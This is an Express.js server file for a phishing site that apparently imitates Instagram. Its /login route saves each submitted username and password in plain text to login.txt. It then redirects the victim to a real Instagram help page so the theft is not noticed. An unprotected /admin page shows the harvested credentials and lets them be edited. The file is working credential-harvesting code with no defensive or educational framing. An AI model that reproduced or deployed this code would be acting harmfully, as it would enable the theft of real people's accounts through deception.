const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use('/images', express.static(path.join(__dirname, 'images')));
app.use(express.static(__dirname)); // To serve img.png, img2.png, index.html, etc.

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle login form submission
app.post('/login', (req, res) => {
    const username = req.body.username?.trim();
    const password = req.body.password?.trim();

    if (username && password) {
        const entry = `Username: ${username} | Password: ${password}\n`;
        fs.appendFileSync(path.join(__dirname, 'login.txt'), entry, 'utf8');
        return res.redirect('https://help.instagram.com/398038890351915');
    } else {
        res.status(400).send('Invalid request.');
    }
});

// Show editable admin panel
app.get('/admin', (req, res) => {
    const filePath = path.join(__dirname, 'login.txt');
    const content = fs.existsSync(filePath) ? fs.readFileSync(filePath, 'utf8') : '';

    res.send(`
        <html>
        <head><title>Admin Panel</title></head>
        <body>
            <h2>Edit login.txt</h2>
            <form method="POST" action="/admin/save">
                <textarea name="content" rows="20" cols="100">${content.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</textarea><br><br>
                <button type="submit">Save</button>
            </form>
        </body>
        </html>
    `);
});

// Save changes from admin panel
app.post('/admin/save', (req, res) => {
    const content = req.body.content;
    fs.writeFileSync(path.join(__dirname, 'login.txt'), content, 'utf8');
    res.redirect('/admin');
});

app.listen(3000, () => {
    console.log('Server running at http://localhost:3000');
});
